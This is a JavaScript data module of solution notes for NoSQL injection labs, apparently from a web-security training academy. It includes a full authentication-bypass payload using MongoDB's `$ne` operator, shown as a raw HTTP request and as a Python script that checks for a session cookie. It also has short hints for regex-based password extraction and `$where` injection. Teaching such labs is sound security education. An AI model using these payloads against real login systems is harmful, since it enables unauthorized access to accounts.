export default {
  'nosql-injection-lab-nosql-injection-detection': {
    note: 'A category filter is interpolated into a MongoDB query; a quote or `$ne` changes the result set, proving injection.'
  },
  'nosql-injection-lab-nosql-injection-bypass-authentication': {
    note: 'The JSON login body is passed straight into `findOne`; send `{"$ne": null}` for both fields to match the first user.',
    work: {
      hints: [
        'The login request is JSON. Change a string value into an object with an operator.',
        'MongoDB treats `{"$ne": null}` as "any value except null"; the equality check disappears.',
        'Send `{"username":{"$ne":null},"password":{"$ne":null}}` and look for a session cookie.'
      ],
      approach:
        'Type confusion in a query document. The server expects strings and forwards whatever JSON it receives. An object with a `$`-prefixed key is an operator expression to MongoDB, so the predicate matches the first document in the collection rather than a specific credential pair.',
      request: `POST /login HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/json

{"username":{"$ne":null},"password":{"$ne":null}}`,
      tokens: [
        ['{', 'Starts a JSON object where the server expected a string for the username field.'],
        ['"$ne"', 'MongoDB "not equal" operator. Any `$`-prefixed key is interpreted as an operator.'],
        ['null', 'The comparison value. Almost every real document field is not null, so the predicate is true.'],
        ['"password"', 'The same construction removes the password equality check.'],
        ['(first match)', '`findOne` returns the first user, often administrator, and the app issues a session.']
      ],
      script: `import sys, requests

host = sys.argv[1]
base = f"https://{host}"
s = requests.Session()
r = s.post(f"{base}/login", json={"username": {"$ne": None}, "password": {"$ne": None}}, timeout=20)
print(r.status_code, "session" in s.cookies, s.cookies.get_dict())`
    }
  },
  'nosql-injection-lab-nosql-injection-extract-data': {
    note: 'The login response is boolean; use `$regex` on the password field to recover it one character at a time.'
  },
  'nosql-injection-lab-nosql-injection-extract-unknown-fields': {
    note: 'Field names are unknown; use `$where` with JavaScript in the login query to test field existence and values.'
  }
}
